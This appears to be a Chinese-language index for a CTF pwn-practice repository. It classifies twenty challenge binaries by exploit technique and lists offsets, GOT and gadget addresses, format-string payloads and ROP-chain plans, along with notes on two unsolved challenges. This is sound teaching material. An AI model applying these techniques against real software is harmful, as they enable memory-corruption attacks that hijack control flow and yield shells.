# 题型模式分类（Pattern Classification）

> 分类依据：每道题目录中的 `speedrun.md`，并结合二进制架构、输入函数、覆盖目标与成功分支进行交叉验证。
> 重构原则：不再“一题一目录”，而是把具有相同利用原语的题目文件放入同一个模式目录。

---

## 1. 分类原则

本仓库目前按七类利用原语（exploit primitive）划分：

| 模式目录 | 共同模式特征 | 判定核心 |
| --- | --- | --- |
| `network_interaction_free_shell` | 网络交互 / 白给 Shell | 程序自身执行 `system("/bin/sh")` 或 `execve("/bin/sh")`，没有可控输入点，利用只发生在网络层 |
| `ret2text` | 栈溢出 + ret2text | 覆盖 saved RIP，跳转到二进制 `.text` 内已有的后门函数或代码片段 |
| `ret2libc` | 栈溢出 + leak libc | 覆盖 saved RIP，先 leak libc 地址，再返回 libc 的 `system("/bin/sh")` |
| `format_string_write` | 格式化字符串任意写 | `printf(user_input)`，用 `%n` 改全局变量 / GOT / 返回地址 |
| `stack_local_var_overwrite` | 栈溢出改局部变量 / 条件绕过 | 只覆盖与缓冲区相邻的局部变量，使条件判断成立，不控制 RIP |
| `heap_uaf` | 释放后使用 | free 后指针仍被引用，重新分配旧对象，改写函数指针 / vtable / 控制流 |
| `heap_exploitation` | 堆布局 / 分配器元数据 | 利用堆溢出、fastbin/unsorted bin、对象指针或分配器 hook 达成任意写 / 控制流 |

判定顺序：

```text
1. 有没有可控输入 / 内存破坏点？
   └─ 没有，且程序直接给 shell → network_interaction_free_shell
2. 输入是否被直接传给 printf？
   └─ 是 → format_string_write
3. 溢出的目标是 saved RIP 吗？
   ├─ 是，且跳转到二进制内已有代码 → ret2text
   ├─ 是，但需要 leak libc 才能调用 system → ret2libc
   └─ 否，只是改相邻局部变量 → stack_local_var_overwrite
4. 漏洞在堆上吗？
   ├─ free 后指针仍被引用，可重占旧对象 → heap_uaf
   └─ 需要操纵堆布局 / 分配器元数据 / 相邻对象指针 → heap_exploitation
```

---

## 2. 总览

| ID | 题目 | speedrun 声明的题型 | 模式目录 | 利用原语 | 偏移 | 目标 / 关键值 |
| --- | --- | --- | --- | --- | --- | --- |
| 01 | `test_your_nc` | 网络交互 / 白给 Shell | `network_interaction_free_shell` | 直接连接交互式 shell | N/A | `main → system("/bin/sh")` |
| 02 | `rip` | ret2text / 64 位 `gets` 栈溢出 | `ret2text` | 覆盖 RIP 跳到后门 `fun` | **23** | `0x401187`（`0x401186 + 1`） |
| 03 | `warmup_csaw_2016` | ret2text / stripped / 64 位 `gets` 栈溢出 | `ret2text` | 覆盖 RIP 跳到后门 | **72** | `0x40060e`（`0x40060d + 1`） |
| 04 | `ciscn_2019_n_1` | 栈溢出改局部 `float` 变量 / 条件绕过 | `stack_local_var_overwrite` | 覆盖 `float v2` 绕过比较 | **44** | `11.28125` = `0x41348000` |
| 05 | `get_started_3dsctf_2016` | ret2text / 32 位静态 ELF / 隐藏后门 | `ret2text` | 覆盖 EIP 调隐藏后门并伪造参数 | **56** | `get_flag@0x080489a0`，参数 `0x308cd64f` / `0x195719d1`，返回接 `exit@0x0804e6a0` |
| 06 | `jarvisoj_level0` | ret2text / 64 位 `read` 栈溢出 | `ret2text` | 覆盖 RIP 跳到后门 `callsystem` | **136** | `0x400597`（`0x400596 + 1`） |
| 07 | `newstarctf_2023_ret2libc` | ret2libc / 64 位 `read` 栈溢出 | `ret2libc` | leak `puts@got`，回 `main`，二阶段 `system` | **40** | `puts@got=0x601018`、`pop rdi=0x400763`、`ret=0x400506`、`main=0x400698` |
| 08 | `fifth_space_2019_pwn5` | 格式化字符串任意写 / 条件绕过 | `format_string_write` | `%10$n` 改 `/dev/urandom` 读入的全局密码 | format **10** | `0x804c044` 写 **4**，再输入 `"4"` |
| 09 | `canary` | ret2text + canary / format string | `ret2text` | leak canary/PIE，改全局 `money` 长度，再 canary-safe ROP | **56**（canary 40） | `%11$p` canary、`%17$p` PIE、`%256c%9$n` 写 `money` |
| 10 | `jarvisoj_level4` | ret2libc / 32 位 `read` 栈溢出 | `ret2libc` | `write` leak + 返回 `main` + `system` | **140** | `write@plt=0x8048340`、`write@got=0x804A018`、`main=0x8048470` |
| 11 | `2018_rop` | ret2libc / 32 位 `read` 栈溢出 | `ret2libc` | `write` leak + 返回 `main` + `system` | **140** | `write@plt=0x80483A0`、`write@got=0x804A010`、`main=0x80484C6` |
| 12 | `bjdctf_2020_babyrop` | ret2libc / 64 位 `read` 栈溢出 | `ret2libc` | `puts` leak + 返回 `main` + `ret` 对齐 | **40** | `puts@got=0x601018`、`pop rdi=0x400733`、`ret=0x4004C9` |
| 13 | `putsorsys` | ret2libc + 格式化字符串 / canary | `ret2libc` | `%13$p` canary、`%9$s` leak `puts`、保留 canary ROP | **0x38**（canary 0x28） | `puts@got=0x404018`、`/bin/sh=0x40205E`、`pop rdi=libc+0x2A3E5` |
| 14 | `hitcontraining_uaf` | heap UAF / 函数指针劫持 | `heap_uaf` | tcache/fastbin 重占旧 struct，改 `print=magic` | struct **8** | `magic=0x8048945` |
| 15 | `babyheap_Octf_2017` | heap / unsorted leak + fastbin + hook | `heap_exploitation` | fake 0x80 chunk -> `__malloc_hook` | `0x3C4B78` leak | `__malloc_hook=libc+0x3C4B10`、fake=`libc+0x3C41E9`、one_gadget=`libc+0x4527A` |
| 16 | `babyfengshui_33c3_2016` | heap / 相邻对象指针改写 | `heap_exploitation` | `fgets@GOT` leak -> `free@GOT=system` | **0xC0** | `FGETS_GOT=0x804B014`、`FREE_GOT=0x804B010` |
| 17 | `others_shellcode` | 网络交互 / 白给 Shell | `network_interaction_free_shell` | `main -> getShell -> int 0x80 execve` | N/A | 无地址 / 无偏移 |
| 18 | `repeater` | canary leak + ret2libc / 64 位回显型溢出 | `ret2libc` | `puts(buf)` 泄 canary，`puts(read@got)` 泄 libc，回 `main` 二阶段 | **0x28**（canary 0x28，RIP 0x38） | `pop rdi;ret=0x400933`、`ret=0x400934`、`read@got=0x601030`、`main=0x4007d9` |
| 19 | `pwnable_silverbullet` | 逻辑 bug 型栈越界 + ret2libc / 32 位 | `ret2libc` | `strncat` 的 NUL 打坏 `power`，`power` 与 `strlen(desc)` 失配后越界写；`beat` 获胜逼出 `main` 的 `ret` | 越界 **0x2f**（起点 `ebp-0x3`） | `read@plt=0x8048490`、`puts@plt=0x80484a8`、`read@got=0x804afd0`、`main=0x8048954` |
| 20 | `bbbaby_pwn1` | 任意写 + canary 绕过 + ret2libc / 64 位 | `ret2libc` | 8 字节任意写把 `__stack_chk_fail@got` 改成 `leave;ret`，canary 失败反而成为栈迁移入口；CSU ROP leak libc 后把 `atoi@got` 改成 `system` | **0x110**（canary 0x108） | `leave;ret=0x40086a`、`csu_pop=0x4009fa`、`csu_call=0x4009e0`、`__stack_chk_fail@got=0x601020`、`atoi@got=0x601040` |

---

## 3. 逐题判定依据

### 3.1 `01_test_your_nc` → `network_interaction_free_shell`

speedrun 中的关键证据：

```text
题型：网络交互 / 白给 Shell
main 里只有 system("/bin/sh")
没有输入，没有 gets，没有偏移
PIE 是干扰项
```

结论：

- `main` 的正常逻辑就是 `system("/bin/sh")`。
- 没有 `gets` / `read` / `scanf` 等可控输入点，不存在栈或堆破坏面。
- PIE / NX / Canary 与利用无关。
- 真正的门槛是 CTF² 平台的 TLS 连接，而不是内存破坏。

### 3.2 `02_rip` → `ret2text`

speedrun 中的关键证据：

```text
题型：ret2text / 64 位 gets 栈溢出
main 里 gets(buf) 的 buf 在 rbp-0xf
offset = 0xf + 8 = 23
fun@0x401186 内部调用 system("/bin/sh")
实际跳 0x401187（跳过 push rbp）
```

结论：

- 漏洞是 `gets()` 无边界写。
- 覆盖目标是 saved RIP。
- 目标是二进制内已有的后门函数 `fun`，符合 ret2text。
- 64 位下跳 `0x401186` 会因 `push rbp` 破坏 `system` 的 16 字节栈对齐，因此跳 `0x401187`。

### 3.3 `03_warmup_csaw_2016` → `ret2text`

speedrun 中的关键证据：

```text
题型：ret2text / stripped / 64 位 gets 栈溢出
程序打印 WOW:0x40060d
0x40060d 处是 system("cat flag.txt")
gets(buf) 的 buf 在 rbp-0x40
offset = 0x40 + 8 = 72
实际跳 0x40060e（跳过 push rbp）
```

结论：

- 虽然 stripped，但程序主动泄露后门地址，静态分析也能定位到 `system("cat flag.txt")`。
- 覆盖 saved RIP，跳转到二进制已有代码，属于 ret2text。
- 后门直接打印 flag，不是 shell，因此不需要 `p.interactive()`。

### 3.4 `04_ciscn_2019_n_1` → `stack_local_var_overwrite`

speedrun 中的关键证据：

```text
题型：栈溢出改局部 float 变量 / 条件绕过
char buf[44] @ rbp-0x30
float v2    @ rbp-0x4
gets(buf) 无边界检查
offset = 0x30 - 0x4 = 44
11.28125 的 IEEE-754 单精度位模式 = 0x41348000
成功分支 system("cat /flag")
```

结论：

- 漏洞仍是 `gets()` 栈溢出，但覆盖目标不是 saved RIP，而是相邻的 `float v2`。
- 写入正确的 float 位模式后，原程序的比较条件成立，进入 `system("cat /flag")`。
- 不需要地址、不需要 ROP、不需要控制流劫持，因此独立成类，而不是归入 ret2text。

### 3.5 `05_get_started_3dsctf_2016` → `ret2text`

speedrun 中的关键证据：

```text
题型：ret2text / 32 位静态 ELF / 隐藏后门
gets() 栈溢出，offset 56
跳 get_flag@0x080489a0
伪造两个参数：0x308cd64f、0x195719d1
get_flag 的返回地址接 exit@0x0804e6a0
exit 刷新 stdout，flag 到达远端
```

结论：

- 32 位 i386、静态链接、No PIE、No canary、NX enabled。
- 隐藏后门 `get_flag(int, int)` 没有被任何代码调用，符合“跳到二进制已有代码”的 ret2text。
- 与 02 / 03 的差异：需要按 cdecl 在栈上伪造两个参数，并把返回地址接到 `exit` 以刷新全缓冲 stdout。

### 3.6 `06_jarvisoj_level0` → `ret2text`

speedrun 中的关键证据：

```text
题型：ret2text / 64 位 read 栈溢出
vulnerable_function: char buf[0x80] @ rbp-0x80
read(0, buf, 0x200)
offset = 0x80 + 8 = 0x88 = 136
callsystem@0x400596 内 system("/bin/sh")
实际跳 0x400597（跳过 push rbp）
```

结论：

- 64 位动态 ELF、No RELRO、No canary、NX enabled、No PIE、not stripped。
- 漏洞是 `read()` 的无边界写，覆盖目标是 saved RIP。
- 目标是二进制内已有的后门 `callsystem`，符合 ret2text。
- 与 02 / 03 的差异：输入函数是 `read` 而不是 `gets`，但同样是 64 位 `+1` 栈对齐技巧。

### 3.7 `07_newstarctf_2023_ret2libc` → `ret2libc`

speedrun 中的关键证据：

```text
题型：ret2libc / 64 位 read 栈溢出
main: char buf[0x20] @ rbp-0x20
read(0, buf, 0x100)
offset = 0x20 + 8 = 40
No canary + No PIE + Partial RELRO
没有 system@plt；有 puts@plt@0x400520 / puts@got@0x601018
pop rdi; ret @0x400763；ret @0x400506；main @0x400698
Stage 1: puts(puts@got) -> return main
Stage 2: system("/bin/sh")
```

结论：

- 覆盖目标是 saved RIP，但二进制内没有可直接复用的 `system` 后门，因此不是 ret2text。
- 需要先 leak `puts` 的真实地址，算 libc base，再二阶段调用 `system("/bin/sh")`。
- 64 位下 Stage 1 / Stage 2 都要用 `ret` gadget 维持 16 字节栈对齐。
- 原题按 Ubuntu 18.04 构建时，可用 `libc6 2.27-3ubuntu1.6` 的 `puts=0x080970`、`system=0x04f420`、`/bin/sh=0x1b3d88`；否则用附件 libc 或 libc.rip 识别。

### 3.8 `08_fifth_space_2019_pwn5` → `format_string_write`

speedrun 中的关键证据：

```text
题型：格式化字符串任意写 / 条件绕过
32 位 i386，Canary + NX + No PIE + Partial RELRO
open("/dev/urandom"); read(fd, 0x804c044, 4)
read(0, name, 0x63); printf(name)
read(0, pass, 0xf); atoi(pass) 与 *(0x804c044) 比较
printf(name) 的 format offset = 10
name = p32(0x804c044) + "%10$n" -> 写入 4
pass = "4" -> atoi("4") == 4 -> system("/bin/sh")
```

结论：

- 漏洞是 `printf(user_input)` 的格式化字符串写，不是栈溢出。
- Canary 虽然开启，但 `name` / `pass` 的 `read` 长度都碰不到它，因此是干扰项。
- 目标是全局随机密码 `0x804c044`；用 `%10$n` 把它改成 4，再输入 `"4"` 即可绕过比较。
- 本地实测 `%9` / `%11` 都崩溃，只有 `%10$n` 命中 name 缓冲区，format offset 唯一。

---

### 3.9 `09_canary` → `ret2text`

speedrun 中的关键证据：

```text
题型：ret2text + canary leak + format string + PIE
main: char vivo50[32] @ rbp-0x30
read(0, vivo50, 0x20); printf(vivo50)
read(0, vivo50, 0x20); printf(vivo50)
read(0, vivo50, money)
canary @ rbp-8
%11$p -> canary; %17$p -> main (PIE)
%256c%9$n + p64(money) -> money = 256
第三轮 offset 40 + canary + 8 + ret/pop rdi/binsh/system
```

结论：

- 有栈溢出，覆盖目标是 saved RIP；但 canary 开启，且二进制是 PIE，不能直接硬编码地址。
- 目标仍然是二进制内已有的 `system@plt`，所以归入 `ret2text`，不是 ret2libc。
- `backdoor` 执行的是 `system("echo ...")`，不是 shell，是干扰项。
- 关键点是先用 `printf(vivo50)` leak canary/PIE，再用第二个 `printf` 把全局 `money` 改成 256，最后 canary-safe ROP。

### 3.10 `10_jarvisoj_level4` → `ret2libc`

speedrun 中的关键证据：

```text
题型：ret2libc / 32 位 read 栈溢出
vulnerable_function: char buf[0x88] @ ebp-0x88
read(0, buf, 0x100)
offset = 0x88 + 4 = 140
没有 system@plt；有 write@plt / write@got
Stage 1: write(1, write@got, 4) -> main
Stage 2: system("/bin/sh")
```

结论：

- 32 位 cdecl，参数在栈上；覆盖 saved EIP。
- 二进制没有 `system` 后门，但 Partial RELRO 允许读 GOT；先用 `write` leak，再返回 `main` 触发第二次 `read`。
- 属于标准 32 位 ret2libc 模板，和 11 只有地址差异。

### 3.11 `11_2018_rop` → `ret2libc`

speedrun 中的关键证据：

```text
题型：ret2libc / 32 位 read 栈溢出
vulnerable_function: char buf[0x88] @ ebp-0x88
read(0, buf, 0x100)
offset = 140
write@plt=0x80483A0, write@got=0x804A010, main=0x80484C6
Stage 1: write(1, write@got, 4) -> main
Stage 2: system("/bin/sh")
```

结论：

- 和 10 同一套 32 位 `write` leak 模板；`be_nice_to_people` 的 `setresgid` 与利用无关。
- 覆盖 saved EIP，先 leak，再返回 `main`，最后 `system` + dummy + `/bin/sh`。

### 3.12 `12_bjdctf_2020_babyrop` → `ret2libc`

speedrun 中的关键证据：

```text
题型：ret2libc / 64 位 read 栈溢出
vuln: char buf[0x20] @ rbp-0x20
read(0, buf, 0x64)
offset = 0x20 + 8 = 40
puts@plt=0x4004E0, puts@got=0x601018
pop rdi=0x400733, ret=0x4004C9, main=0x4006AD
Stage 1: pop rdi; puts@got; puts@plt; main
Stage 2: ret; pop rdi; binsh; system
```

结论：

- 64 位下 leak 用 `pop rdi; ret` 把 `puts@got` 放进 `rdi`。
- Stage 1 返回 `main`，再次触发 `vuln`；Stage 2 先放 `ret` 维持 `system` 的 16 字节栈对齐。
- `puts` leak 是变长（遇到 `\x00` 停止），必须 `ljust(8, b"\x00")`。

### 3.13 `13_putsorsys` → `ret2libc`

speedrun 中的关键证据：

```text
题型：ret2libc + 格式化字符串 / 64 位 canary
main: menu 循环；char buf[0x30] @ rbp-0x30；canary @ rbp-8
read(0, buf, 0x100); printf(buf)
offset to canary = 0x28
%13$p -> canary; %9$s + p64(puts@got) -> puts leak
第三轮: 0x28 A + canary + 8 B + ret / pop rdi / binsh / system
choice=0 -> leave; ret
```

结论：

- 不是纯 ret2libc：先用格式化字符串 leak canary 和 `puts`，第三轮才做 canary-safe ROP。
- `/bin/sh` 在二进制 `.rodata`（`0x40205E`），`pop rdi` / `ret` 用附件 libc 的偏移。
- 因为最终还是 `system("/bin/sh")`，归入 `ret2libc`，但必须标记“格式化字符串 + canary”这个差异点。

---

### 3.14 `14_hitcontraining_uaf` → `heap_uaf`

speedrun 中的关键证据：

```text
题型：heap UAF / 函数指针劫持
struct note { void (*print)(note *); char *content; };  // 8 字节
delete_note: free(content); free(struct); 不置空 notelist[idx]
add_note: struct = malloc(8); content = malloc(size)
magic=0x8048945 -> system("/bin/sh")
```

结论：

- 漏洞是 free 后指针仍被引用：`notelist[idx]` 没有清空。
- 0x10 tcache/fastbin LIFO 让新 note 的 content 落回旧 struct，写入 `p32(magic)` 改写 `print` 指针。
- `show(0)` 调用 `magic()`，直接拿 shell；属于 UAF，不是普通堆溢出。

### 3.15 `15_babyheap_Octf_2017` → `heap_exploitation`

speedrun 中的关键证据：

```text
题型：heap / unsorted bin leak + fastbin attack + __malloc_hook
glibc 2.23, amd64, PIE, Full RELRO
Fill 的 size 不受 note 记录限制
main_arena+0x58 = libc+0x3C4B78
__malloc_hook = libc+0x3C4B10
fake chunk = libc+0x3C41E9（size 字段恒为 0x80）
one_gadget = libc+0x4527A
```

结论：

- 先用 unsorted bin 的 `bk` leak libc。
- 再用 fastbin 0x20 链把 C 重取出来，改 `F.size=0x81` + `fd=fake chunk`。
- 第二次 0x70 分配返回 libc fake chunk，从 fake data 一直写到 `__malloc_hook`。
- 关键稳定性点：不要用 `__malloc_hook-0x23`（size 字节随 ASLR 变化），用 `libc+0x3C41E9`（size 恒 0x80）。

### 3.16 `16_babyfengshui_33c3_2016` → `heap_exploitation`

speedrun 中的关键证据：

```text
题型：heap / 相邻 user 的 desc 指针改写
struct user { char *desc; char name[0x7c]; };
add: desc=malloc(size); user=malloc(0x80); user->desc=desc
delete: free(desc); free(user)
offset from UA user to UV->desc = 0xC0
FGETS_GOT=0x804B014; FREE_GOT=0x804B010
```

结论：

- 堆布局：`DA(0x30) UA(0x90) DV(0x30) UV(0x90) DB(0x90) UB(0x90)`。
- `delete(2)`、`delete(0)` 后 `add(0x80)`，desc 落 UA、user 落 UB；从 UA 写 0xC0 命中 UV->desc。
- 先改成 `fgets@GOT` leak libc；再改成 `free@GOT`，用 `update(1, p32(system))` 写 GOT。
- `delete(4)` 先 `free(desc)`，desc 是 `"/bin/sh"`，于是 `system("/bin/sh")`。

### 3.17 `17_others_shellcode` → `network_interaction_free_shell`

speedrun 中的关键证据：

```text
题型：网络交互 / 白给 Shell（execve shellcode）
main: call getShell
getShell: push "/bin//sh"; int 0x80 with eax=11 (SYS_execve)
没有 read / gets / scanf
PIE / NX 是干扰项
```

结论：

- `main` 无条件调用 `getShell`，`getShell` 直接 `execve("/bin//sh", ...)`。
- 没有可控输入，不存在栈/堆破坏；利用只是连接和交互。
- 与 01 的区别：01 是 `system@plt`，17 是手写 `int 0x80` shellcode；两者都归入白给 shell 模式。

### 3.18 `18_repeater` → `ret2libc`

speedrun 中的关键证据：

```text
题型：栈溢出 + canary leak + ret2libc（两阶段）
64 位、No PIE、Canary、NX、Partial RELRO、stripped

main:
  setvbuf(stdin/stdout, 全不缓冲)
  puts(banner)
loop:
  printf("What do you want me to repeat with you? Please enter it to me:")
  read(0, buf, 0x100)        # char buf[0x28] @ rbp-0x30
  puts(buf)                  # 回显：canary / libc 泄漏点
  printf("Do you want to continue?")
  scanf("%d", &g)            # g == 0 继续循环，!= 0 打印 stupid!!! 后 return
  getchar()

canary @ rbp-0x8；buffer -> canary = 0x28；buffer -> saved RIP = 0x38
puts@plt=0x400610；read@got=0x601030；pop rdi;ret=0x400933；ret=0x400934
```

结论：

- `read(0, buf, 0x100)` 对 `buf[0x28]` 无边界，但 `__stack_chk_fail` 挡在前面。
- `puts(buf)` 打印到 NUL 为止：多发 1 个字节覆盖 canary 低字节（`0x00` → `'B'`），
  canary 剩下 7 字节随回显一起吐出，`canary = u64(b"\x00" + tail7)`。
- 循环控制语义是反的：`0` 才继续；想触发 `return` 走 ROP 必须发非 0。
- 两阶段：`puts(read@got)` + 回 `main` 泄 libc；`ret` 对齐后 `system("/bin/sh")`。
- 注意 `read` 短读：泄漏长度不对就整条连接重来（脚本内重试 5 次）。

### 3.19 `19_pwnable_silverbullet` → `ret2libc`

speedrun 中的关键证据：

```text
32 位 i386、No PIE、NX、not stripped、menu 四选项

struct bullet { char desc[0x30]; unsigned power; }  @ ebp-0x34 (power @ ebp-0x4)
werewolf { int hp = 0x7fffffff; char *name = "Gin"; } @ ebp-0x3c / ebp-0x38

create_bullet: read_input(desc, 0x30); power = strlen(desc)
power_up:      if (power > 0x2f) return; n = 0x30 - power;
               read_input(tmp, n); strncat(desc, tmp, n);
               power = power + strlen(tmp)
beat:          hp -= power; if (hp <= 0) "Oh ! You win !!" -> main return

三步打穿：
1) create 47 字节 + '\n'      -> strlen(desc)=0x2f, power=0x2f
2) power_up 只发 1 字节        -> strncat 的 NUL 落在 desc[0x30] = power 低字节
                                 power 变 1，但 strlen(desc) 已是 0x31
3) power_up 第二次 n=0x2f      -> strncat 从 desc+0x31 = ebp-0x3 开始写 0x2f 字节
```

结论：

- 漏洞不是普通 `read`/`gets` 溢出，而是**长度检查字段与写入位置字段不是同一个值**。
- 越界起点 `ebp-0x3`（不是 `-0x4`），前 3 字节灌进 `power` 高 3 位 → `power=0xffffff30`，
  `beat` 的 `hp - power` 变负，才会打印 `Oh ! You win !!` 并让 `main` 走 `leave; ret`；
  选 `4` 是 `exit(0)`，永远不会 `ret`。
- `strncat` 以 NUL 结束 ⇒ 整条 payload（含 ROP 链）不能出现 `\x00`：
  saved ebp 用 `0x01010101` 这类脏值，`system`/`binsh` 含 0 字节时重连重试。
- 泄漏选 `read@got`（`0x804afd0`）：本机 libc 的 `puts` 最低字节是 `0x00`，
  `puts(puts@got)` 只会打印一个空行。
- 两轮：`puts(read@got)` + 回 `main` → `system("/bin/sh")`。

### 3.20 `20_bbbaby_pwn1` → `ret2libc`

speedrun 中的关键证据：

```text
64 位、No PIE、NX、partial RELRO、canary、stripped、6.4KB
read_int() @ 0x4007c7 : 读 10 字节到 [rbp-0x20]，遇 '\n' 截断，return atoi(buf)
main()     @ 0x40090b : sub rsp,0x120；buf = rbp-0x110；canary = rbp-0x8

case 0 @ 0x40086c: puts("address:"); n = read_int(); read(0, (void*)n, 8)
case 1 @ 0x4008bb: puts("size:");    n = read_int(); read(0, buf, n)
其它值:            return  -> main 的 canary 校验与 ret

四步：
1) [0x601020] = 0x40086a   __stack_chk_fail@got -> leave; ret
2) 溢出 buf -> saved rbp/ret（0x108 填充 + canary 乱填 + saved rbp + ROP），
   再选 2 让 main return；canary 校验失败 -> 跳 leave;ret -> 直接执行 ROP
3) ROP（__libc_csu_init）：puts(read@got) -> main   （leak libc）
4) [0x601040] = system      atoi@got -> system
   菜单发 "/bin/sh" -> read_int 内的 atoi(buf) 变成 system("/bin/sh")
```

结论：

- 判定为 `ret2libc`：最终控制流仍是 leak libc + `system`，但它多了一个**任意地址写**原语。
- 关键思路：**canary 校验失败的调用点本身可写**。`call __stack_chk_fail` 是 `jmp [got]`，
  把 GOT 改成 `leave; ret`，失败路径就变成栈迁移入口，无需 leak canary。
- 8 字节写用十进制地址（`atoi` 解析）；`read` 只发 1~7 字节就是部分覆写。
- 无 `pop rdi` → `__libc_csu_init` 的 `pop rbx/rbp/r12/r13/r14/r15`（**0x4009fa**，不是 0x400a0a）
  配 `mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]`（0x4009e0）。
- 第二轮不必再溢出：`atoi@got = system` 后，菜单输入 `/bin/sh` 直接执行。
- 坑：`recvuntil(MENU)` 之后不能再用 `sendlineafter(MENU, ...)`（提示已被消费会死锁）；
  leak 解析要跳过残留 `\n`，按“能让 libc 页对齐”筛。

---

## 4. 仓库结构映射（重构前 → 重构后）

| 重构前（按题目建目录） | 重构后（按模式归档） |
| --- | --- |
| `01_test_your_nc/` | `network_interaction_free_shell/01_test_your_nc_*` |
| `02_rip/` | `ret2text/02_rip_*` |
| `03_warmup_csaw_2016/` | `ret2text/03_warmup_csaw_2016_*` |
| `04_ciscn_2019_n_1/` | `stack_local_var_overwrite/04_ciscn_2019_n_1_*` |
| `05_get_started_3dsctf_2016/` | `ret2text/05_get_started_3dsctf_2016_*` |
| `jarvisoj_level0`（根目录散落） | `ret2text/06_jarvisoj_level0_*`、`ret2text/jarvisoj_level0` |
| `[NewStarCTF 2023 公开赛道]ret2libc`（根目录散落） | `ret2libc/07_newstarctf_2023_ret2libc_*`、`ret2libc/[NewStarCTF 2023 公开赛道]ret2libc` |
| `[第五空间2019决赛]PWN5`（根目录散落） | `format_string_write/08_fifth_space_2019_pwn5_*`、`format_string_write/[第五空间2019决赛]PWN5` |
| `[NewStarCTF 公开赛赛道]canary/`（根目录散落） | `ret2text/09_canary_*`、`ret2text/[NewStarCTF 公开赛赛道]canary/pwn` |
| `jarvisoj_level4`（根目录散落） | `ret2libc/10_jarvisoj_level4_*`、`ret2libc/jarvisoj_level4` |
| `铁人三项（第五赛区）2018_rop`（根目录散落） | `ret2libc/11_2018_rop_*`、`ret2libc/铁人三项（第五赛区）2018_rop` |
| `bjdctf_2020_babyrop`（根目录散落） | `ret2libc/12_bjdctf_2020_babyrop_*`、`ret2libc/bjdctf_2020_babyrop` |
| `putsorsys` + `libc.so.6`（根目录散落） | `ret2libc/13_putsorsys_*`、`ret2libc/putsorsys`、`ret2libc/libc.so.6` |
| `hitcontraining_uaf`（根目录散落） | `heap_uaf/14_hitcontraining_uaf_*`、`heap_uaf/hitcontraining_uaf` |
| `babyheap_Octf_2017`（根目录散落） | `heap_exploitation/15_babyheap_Octf_2017_*`、`heap_exploitation/babyheap_Octf_2017` |
| `babyfengshui_33c3_2016`（根目录散落） | `heap_exploitation/16_babyfengshui_33c3_2016_*`、`heap_exploitation/babyfengshui_33c3_2016` |
| `others_shellcode`（根目录散落） | `network_interaction_free_shell/17_others_shellcode_*`、`network_interaction_free_shell/others_shellcode` |
| `repeater`（根目录散落） | `ret2libc/18_repeater_*`、`ret2libc/repeater` |
| `pwnable_silverbullet`（根目录散落） | `ret2libc/19_pwnable_silverbullet_*`、`ret2libc/pwnable_silverbullet` |
| `[陇原战"疫"2021网络安全大赛]bbbaby/pwn1`（根目录散落） | `ret2libc/20_bbbaby_pwn1_*`、`ret2libc/bbbaby_pwn1`、`ret2libc/libc-2.23.so` |

命名规则：

```text
<模式目录>/<题号>_<题目名>_speedrun.md
<模式目录>/<题号>_<题目名>_writeup.md
<模式目录>/<题号>_<题目名>_exp.py
<模式目录>/<题号>_<题目名>_image*.png
<模式目录>/<原始二进制名>
```

> 原始二进制保留原名，方便直接复制题目中的 `file` / `checksec` / `objdump` 命令。

---

## 5. 待解登记（pending）

以下二进制仍留在仓库根目录，尚未归档到模式目录，避免“强行套模板”造成错误结论。
两份分析已做到“定性 + 阻塞点明确”，后续可以直接接着做。

### 5.1 `rec_33c3_2016`（33C3 CTF 2016 / 32 位计算器）

```text
32 位 i386、动态链接；程序是一个“计算器”交互（读表达式、算结果）
已定位：符号分派表在 0xd3e 附近；疑似未初始化函数指针位于 ebp-0x20
阻塞点：函数指针的写入路径没有在可控输入里找到，需要动态验证“未初始化槽位”假设
```

下一步：

1. 用 `gdb` 在 `0xd3e` 断下，观察 `ebp-0x20` 在第一次分派前的实际值来源。
2. 确认该槽位是否可被输入间接写入（运算结果 / 栈上残留）。
3. 若确认可控，再判定是 `ret2text`（跳到二进制内）还是 `ret2libc`。

### 5.2 `judgement_mna_2016`（MNA 2016 / flag 判定器）

```text
32 位 i386、No PIE（EXEC）、Canary、NX、Partial RELRO

init():
  setbuf(stdin/stdout, NULL)
  load_flag("flag.txt", 0x804a0a0, 0x40)   # flag 读进全局 flag，固定地址
main:
  printf("Flag judgment system\nInput flag >>")
  getnline(buf, 0x40)   # fgets(buf, 0x40, stdin)，buf @ ebp-0x4c
  printf(buf)           # <-- 格式化字符串漏洞
  if (!strcmp(buf, flag)) puts("Correct flag!!"); else puts("Wrong flag...")

getnline 里有一层过滤：strlen 之后逐字节 isprint()，非可打印字符直接 return 0
（main 打印 "Unprintable character" 后退出）=> 无法发送二进制地址
```

实测结论（本地 i386 loader + `%1$p..%264$p` 全扫）：

```text
arg 43  = buf 起始（"AAAA"）
arg 35  = 0x804a030  = strchr@GOT（_dl_runtime_resolve 残留）
arg 72  = 0x804a000  = _GLOBAL_OFFSET_TABLE_
arg 105 = 0x804872b  = main
args 1..264 中不存在 0x804a0a0（flag），也不存在 0x804a010（strcmp@GOT）
```

阻塞点：

- `isprint` 过滤让“把 `0x804a0a0` 塞进格式串”这条路彻底断掉（地址字节含 `0x08` / `0x80` / `0xa0`）。
- 能拿到指针槽位只有 `strchr@GOT`（`0x804a030`）与 GOT 基址（`0x804a000`），
  而 `strcmp` / `puts` 都在 `printf(buf)` **之后**才惰性绑定，不会留下指针槽位。
- 可写目标若只有 `strchr@GOT`，写出后程序已无 `strchr` 调用，等于空写。

下一步方向（待验证）：

1. ~~顺序打印读到 `flag`~~：已实测 —— `%35$s` 只吐出 4 个 GOT 指针（16 字节）就被
   `0x804a040` 的零字节截断，`%72$s` 只吐 3 字节，顺序读跨不到 `0x804a0a0`。
2. 检查 `strchr@GOT` 的 LSB 改写能否把 `strchr` 重定向到同页内的可用函数。
3. 用 `%n` 把 `strchr@GOT` 改成 `main`（`0x804872b` ≈ 134M 字符，可接受），
   让程序跑第二轮 —— 第二轮 `strcmp` / `puts` 已解析，才有机会拿到 `0x804a010` 槽位。
